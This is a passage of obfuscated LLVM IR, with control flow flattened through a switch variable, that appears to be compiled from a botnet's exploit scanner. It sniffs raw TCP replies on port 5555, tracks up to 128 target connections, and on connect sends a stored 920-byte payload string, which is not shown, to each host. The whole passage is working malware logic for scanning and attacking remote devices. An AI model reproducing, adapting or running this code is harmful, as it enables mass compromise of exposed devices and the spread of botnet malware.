  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i64 1
  %219 = bitcast %struct.iphdr* %218 to %struct.anon.0*
  store %struct.anon.0* %219, %struct.anon.0** %21, align 8
  %220 = call i32* @__errno_location() #9
  store i32 0, i32* %220, align 4
  %221 = load i32, i32* @exploit_rsck, align 4
  %222 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %223 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %223, align 8
  %224 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %225 = load %struct.sockaddr*, %struct.sockaddr** %224, align 8
  %226 = call i64 @recvfrom(i32 %221, i8* %222, i64 1514, i32 16384, %struct.sockaddr* %225, i32* null)
  %227 = trunc i64 %226 to i32
  store i32 %227, i32* %18, align 4
  %228 = load i32, i32* %18, align 4
  %229 = icmp sle i32 %228, 0
  %230 = select i1 %229, i32 -830251068, i32 -1569697915
  store i32 %230, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = call i32* @__errno_location() #9
  %233 = load i32, i32* %232, align 4
  %234 = icmp eq i32 %233, 11
  %235 = select i1 %234, i32 -830251068, i32 903375643
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = call i32* @__errno_location() #9
  %238 = load i32, i32* %237, align 4
  %239 = icmp eq i32 %238, 11
  %240 = select i1 %239, i32 -830251068, i32 1652302816
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  store i32 -659945137, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i32, i32* %18, align 4
  %244 = sext i32 %243 to i64
  %245 = icmp ult i64 %244, 40
  %246 = select i1 %245, i32 -755096992, i32 1109186992
  store i32 %246, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 9
  %251 = load i32, i32* %250, align 4
  %252 = load i32, i32* @LOCAL_ADDR, align 4
  %253 = icmp ne i32 %251, %252
  %254 = select i1 %253, i32 -454786557, i32 1492458642
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 6
  %259 = load i8, i8* %258, align 1
  %260 = zext i8 %259 to i32
  %261 = icmp ne i32 %260, 6
  %262 = select i1 %261, i32 2048802721, i32 1800971877
  store i32 %262, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %266 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %265, i32 0, i32 0
  %267 = load i16, i16* %266, align 4
  %268 = zext i16 %267 to i32
  %269 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %270 = zext i16 %269 to i32
  %271 = icmp ne i32 %268, %270
  %272 = select i1 %271, i32 853292370, i32 -319402820
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %276 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %275, i32 0, i32 1
  %277 = load i16, i16* %276, align 2
  %278 = zext i16 %277 to i32
  %279 = load i16, i16* %2, align 2
  %280 = zext i16 %279 to i32
  %281 = icmp ne i32 %278, %280
  %282 = select i1 %281, i32 1346270975, i32 -872171988
  store i32 %282, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %286 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = lshr i16 %287, 9
  %289 = and i16 %288, 1
  %290 = icmp ne i16 %289, 0
  %291 = select i1 %290, i32 991077871, i32 484192855
  store i32 %291, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  %294 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 4
  %296 = load i16, i16* %295, align 4
  %297 = lshr i16 %296, 12
  %298 = and i16 %297, 1
  %299 = icmp ne i16 %298, 0
  %300 = select i1 %299, i32 261144939, i32 -1320838439
  store i32 %300, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %304 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %303, i32 0, i32 4
  %305 = load i16, i16* %304, align 4
  %306 = lshr i16 %305, 10
  %307 = and i16 %306, 1
  %308 = icmp ne i16 %307, 0
  %309 = select i1 %308, i32 -1519609505, i32 -983920055
  store i32 %309, i32* %switchVar
  br label %loopEnd

; <label>:310:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = lshr i16 %314, 8
  %316 = and i16 %315, 1
  %317 = icmp ne i16 %316, 0
  %318 = select i1 %317, i32 1297401458, i32 -2073669033
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %322 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %321, i32 0, i32 3
  %323 = load i32, i32* %322, align 4
  %324 = call i32 @ntohl(i32 %323) #9
  %325 = sub i32 %324, 1
  %326 = call i32 @htonl(i32 %325) #9
  %327 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 8
  %329 = load i32, i32* %328, align 4
  %330 = icmp ne i32 %326, %329
  %331 = select i1 %330, i32 1586677976, i32 174903693
  store i32 %331, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %334 = load i32, i32* %9, align 4
  store i32 %334, i32* %18, align 4
  store i32 -1661320666, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = load i32, i32* %18, align 4
  %337 = icmp slt i32 %336, 128
  %338 = select i1 %337, i32 -251688624, i32 371970266
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %341 = load i32, i32* %18, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %340, i64 %342
  %344 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %343, i32 0, i32 2
  %345 = load i32, i32* %344, align 8
  %346 = icmp eq i32 %345, 0
  %347 = select i1 %346, i32 1203669246, i32 -2019807105
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %350 = load i32, i32* %18, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %349, i64 %351
  store %struct.exploit_scanner_connection* %352, %struct.exploit_scanner_connection** %22, align 8
  %353 = load i32, i32* %18, align 4
  store i32 %353, i32* %9, align 4
  store i32 371970266, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  store i32 -2104576714, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i32, i32* %18, align 4
  %357 = add nsw i32 %356, 1
  store i32 %357, i32* %18, align 4
  store i32 -1661320666, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %360 = icmp eq %struct.exploit_scanner_connection* %359, null
  %361 = select i1 %360, i32 1277688829, i32 -978850611
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  store i32 -659945137, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 8
  %366 = load i32, i32* %365, align 4
  %367 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %368 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %367, i32 0, i32 3
  store i32 %366, i32* %368, align 4
  %369 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %370 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %369, i32 0, i32 0
  %371 = load i16, i16* %370, align 4
  %372 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %373 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %372, i32 0, i32 4
  store i16 %371, i16* %373, align 8
  %374 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %374)
  store i32 -769521653, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  store i32 1208370666, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %378 = getelementptr inbounds [16 x i64], [16 x i64]* %377, i64 0, i64 0
  %379 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %378) #6, !srcloc !1
  %380 = extractvalue { i64, i64* } %379, 0
  %381 = extractvalue { i64, i64* } %379, 1
  %382 = trunc i64 %380 to i32
  store i32 %382, i32* %24, align 4
  %383 = ptrtoint i64* %381 to i64
  %384 = trunc i64 %383 to i32
  store i32 %384, i32* %25, align 4
  store i32 592981134, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  store i32 -840076388, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %388 = getelementptr inbounds [16 x i64], [16 x i64]* %387, i64 0, i64 0
  %389 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %388) #6, !srcloc !2
  %390 = extractvalue { i64, i64* } %389, 0
  %391 = extractvalue { i64, i64* } %389, 1
  %392 = trunc i64 %390 to i32
  store i32 %392, i32* %26, align 4
  %393 = ptrtoint i64* %391 to i64
  %394 = trunc i64 %393 to i32
  store i32 %394, i32* %27, align 4
  store i32 -420402518, i32* %switchVar
  br label %loopEnd

; <label>:395:                                    ; preds = %loopEntry
  store i32 0, i32* %1, align 4
  store i32 1951427156, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i32, i32* %1, align 4
  %398 = icmp slt i32 %397, 128
  %399 = select i1 %398, i32 1719850364, i32 1492732017
  store i32 %399, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  store i32 5, i32* %28, align 4
  %401 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %402 = load i32, i32* %1, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %401, i64 %403
  store %struct.exploit_scanner_connection* %404, %struct.exploit_scanner_connection** %7, align 8
  %405 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %406 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %405, i32 0, i32 2
  %407 = load i32, i32* %406, align 8
  %408 = icmp ne i32 %407, 0
  %409 = select i1 %408, i32 133059228, i32 -2082267052
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i32, i32* @exploit_fake_time, align 4
  %412 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %413 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %412, i32 0, i32 1
  %414 = load i32, i32* %413, align 4
  %415 = sub i32 %411, %414
  %416 = load i32, i32* %28, align 4
  %417 = icmp ugt i32 %415, %416
  %418 = select i1 %417, i32 450439605, i32 -2082267052
  store i32 %418, i32* %switchVar
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %421 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 8
  %423 = call i32 @close(i32 %422)
  %424 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %425 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %424, i32 0, i32 0
  store i32 -1, i32* %425, align 8
  %426 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %427 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %426, i32 0, i32 2
  store i32 0, i32* %427, align 8
  %428 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %429 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %428, i32 0, i32 6
  %430 = getelementptr inbounds [256 x i8], [256 x i8]* %429, i32 0, i32 0
  call void @util_zero(i8* %430, i32 256)
  store i32 1755264721, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %433 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %432, i32 0, i32 2
  %434 = load i32, i32* %433, align 8
  %435 = icmp eq i32 %434, 1
  %436 = select i1 %435, i32 260764276, i32 1707209386
  store i32 %436, i32* %switchVar
  br label %loopEnd

; <label>:437:                                    ; preds = %loopEntry
  %438 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %439 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %438, i32 0, i32 2
  %440 = load i32, i32* %439, align 8
  %441 = icmp eq i32 %440, 3
  %442 = select i1 %441, i32 260764276, i32 1633873587
  store i32 %442, i32* %switchVar
  br label %loopEnd

; <label>:443:                                    ; preds = %loopEntry
  %444 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %445 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %444, i32 0, i32 2
  %446 = load i32, i32* %445, align 8
  %447 = icmp eq i32 %446, 4
  %448 = select i1 %447, i32 260764276, i32 -1004395502
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %451 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %450, i32 0, i32 0
  %452 = load i32, i32* %451, align 8
  %453 = srem i32 %452, 64
  %454 = zext i32 %453 to i64
  %455 = shl i64 1, %454
  %456 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %457 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %458 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %457, i32 0, i32 0
  %459 = load i32, i32* %458, align 8
  %460 = sdiv i32 %459, 64
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds [16 x i64], [16 x i64]* %456, i64 0, i64 %461
  %463 = load i64, i64* %462, align 8
  %464 = or i64 %463, %455
  store i64 %464, i64* %462, align 8
  %465 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %466 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %465, i32 0, i32 0
  %467 = load i32, i32* %466, align 8
  %468 = load i32, i32* %12, align 4
  %469 = icmp sgt i32 %467, %468
  %470 = select i1 %469, i32 -581207218, i32 -152296313
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %473 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %472, i32 0, i32 0
  %474 = load i32, i32* %473, align 8
  store i32 %474, i32* %12, align 4
  store i32 -152296313, i32* %switchVar
  br label %loopEnd

; <label>:475:                                    ; preds = %loopEntry
  store i32 1854909961, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %478 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %477, i32 0, i32 2
  %479 = load i32, i32* %478, align 8
  %480 = icmp ne i32 %479, 0
  %481 = select i1 %480, i32 -1900775709, i32 894232763
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %484 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %483, i32 0, i32 0
  %485 = load i32, i32* %484, align 8
  %486 = srem i32 %485, 64
  %487 = zext i32 %486 to i64
  %488 = shl i64 1, %487
  %489 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %490 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %491 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %490, i32 0, i32 0
  %492 = load i32, i32* %491, align 8
  %493 = sdiv i32 %492, 64
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds [16 x i64], [16 x i64]* %489, i64 0, i64 %494
  %496 = load i64, i64* %495, align 8
  %497 = or i64 %496, %488
  store i64 %497, i64* %495, align 8
  %498 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %499 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %498, i32 0, i32 0
  %500 = load i32, i32* %499, align 8
  %501 = load i32, i32* %11, align 4
  %502 = icmp sgt i32 %500, %501
  %503 = select i1 %502, i32 -43210111, i32 -1079715738
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %506 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %505, i32 0, i32 0
  %507 = load i32, i32* %506, align 8
  store i32 %507, i32* %11, align 4
  store i32 -1079715738, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 894232763, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  store i32 1854909961, i32* %switchVar
  br label %loopEnd

; <label>:510:                                    ; preds = %loopEntry
  store i32 1755264721, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %1, align 4
  %513 = add nsw i32 %512, 1
  store i32 %513, i32* %1, align 4
  store i32 1951427156, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %515, align 8
  %516 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i64 1, i64* %516, align 8
  %517 = load i32, i32* %12, align 4
  %518 = load i32, i32* %11, align 4
  %519 = icmp sgt i32 %517, %518
  %520 = select i1 %519, i32 213691227, i32 1956690409
  store i32 %520, i32* %switchVar
  br label %loopEnd

; <label>:521:                                    ; preds = %loopEntry
  %522 = load i32, i32* %12, align 4
  store i32 -550932335, i32* %switchVar
  store i32 %522, i32* %.reg2mem2
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  %524 = load i32, i32* %11, align 4
  store i32 -550932335, i32* %switchVar
  store i32 %524, i32* %.reg2mem2
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  %.reload3 = load i32, i32* %.reg2mem2
  %526 = add nsw i32 1, %.reload3
  %527 = call i32 @select(i32 %526, %struct.fd_set* %5, %struct.fd_set* %6, %struct.fd_set* null, %struct.timeval* %8)
  store i32 %527, i32* %13, align 4
  %528 = call i64 @time(i64* null) #6
  %529 = trunc i64 %528 to i32
  store i32 %529, i32* @exploit_fake_time, align 4
  store i32 0, i32* %1, align 4
  store i32 1378769907, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i32, i32* %1, align 4
  %532 = icmp slt i32 %531, 128
  %533 = select i1 %532, i32 -1511524521, i32 1579678782
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %536 = load i32, i32* %1, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %535, i64 %537
  store %struct.exploit_scanner_connection* %538, %struct.exploit_scanner_connection** %7, align 8
  %539 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %540 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %539, i32 0, i32 0
  %541 = load i32, i32* %540, align 8
  %542 = icmp eq i32 %541, -1
  %543 = select i1 %542, i32 -2041434998, i32 -1353425418
  store i32 %543, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  store i32 560828450, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  %546 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %547 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %548 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %547, i32 0, i32 0
  %549 = load i32, i32* %548, align 8
  %550 = sdiv i32 %549, 64
  %551 = sext i32 %550 to i64
  %552 = getelementptr inbounds [16 x i64], [16 x i64]* %546, i64 0, i64 %551
  %553 = load i64, i64* %552, align 8
  %554 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %555 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %554, i32 0, i32 0
  %556 = load i32, i32* %555, align 8
  %557 = srem i32 %556, 64
  %558 = zext i32 %557 to i64
  %559 = shl i64 1, %558
  %560 = and i64 %553, %559
  %561 = icmp ne i64 %560, 0
  %562 = select i1 %561, i32 -1908548070, i32 1765219740
  store i32 %562, i32* %switchVar
  br label %loopEnd

; <label>:563:                                    ; preds = %loopEntry
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %564 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %565 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %564, i32 0, i32 0
  %566 = load i32, i32* %565, align 8
  %567 = bitcast i32* %29 to i8*
  %568 = call i32 @getsockopt(i32 %566, i32 1, i32 4, i8* %567, i32* %31) #6
  store i32 %568, i32* %30, align 4
  %569 = load i32, i32* %29, align 4
  %570 = icmp eq i32 %569, 0
  %571 = select i1 %570, i32 1341658493, i32 -2068495245
  store i32 %571, i32* %switchVar
  br label %loopEnd

; <label>:572:                                    ; preds = %loopEntry
  %573 = load i32, i32* %30, align 4
  %574 = icmp eq i32 %573, 0
  %575 = select i1 %574, i32 -247565742, i32 -2068495245
  store i32 %575, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  %577 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %578 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %577, i32 0, i32 2
  %579 = load i32, i32* %578, align 8
  %580 = icmp eq i32 %579, 3
  %581 = select i1 %580, i32 287938124, i32 -422702542
  store i32 %581, i32* %switchVar
  br label %loopEnd

; <label>:582:                                    ; preds = %loopEntry
  %583 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %584 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %583, i32 0, i32 8
  %585 = getelementptr inbounds [2560 x i8], [2560 x i8]* %584, i32 0, i32 0
  %586 = call i32 @util_strcpy(i8* %585, i8* getelementptr inbounds ([920 x i8], [920 x i8]* @.str.73, i32 0, i32 0))
  %587 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %588 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %587, i32 0, i32 0
  %589 = load i32, i32* %588, align 8
  %590 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %591 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %590, i32 0, i32 8
  %592 = getelementptr inbounds [2560 x i8], [2560 x i8]* %591, i32 0, i32 0
  %593 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %594 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %593, i32 0, i32 8
  %595 = getelementptr inbounds [2560 x i8], [2560 x i8]* %594, i32 0, i32 0
  %596 = call i32 @util_strlen(i8* %595)
  %597 = sext i32 %596 to i64
  %598 = call i64 @send(i32 %589, i8* %592, i64 %597, i32 16384)
  %599 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %600 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %599, i32 0, i32 8
  %601 = getelementptr inbounds [2560 x i8], [2560 x i8]* %600, i32 0, i32 0
  call void @util_zero(i8* %601, i32 2560)
  %602 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %603 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %602, i32 0, i32 6
  %604 = getelementptr inbounds [256 x i8], [256 x i8]* %603, i32 0, i32 0
  call void @util_zero(i8* %604, i32 256)
  %605 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %606 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %605, i32 0, i32 2
  store i32 4, i32* %606, align 8
  store i32 560828450, i32* %switchVar
  br label %loopEnd

; <label>:607:                                    ; preds = %loopEntry
  %608 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %609 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %608, i32 0, i32 2
  %610 = load i32, i32* %609, align 8
  %611 = icmp eq i32 %610, 4
  %612 = select i1 %611, i32 1107828190, i32 1464374826
  store i32 %612, i32* %switchVar
  br label %loopEnd

; <label>:613:                                    ; preds = %loopEntry
  %614 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %615 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %614, i32 0, i32 0
  %616 = load i32, i32* %615, align 8
  %617 = call i32 @close(i32 %616)
  %618 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
  %619 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %618, i32 0, i32 0
  store i32 -1, i32* %619, align 8
  %620 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %7, align 8
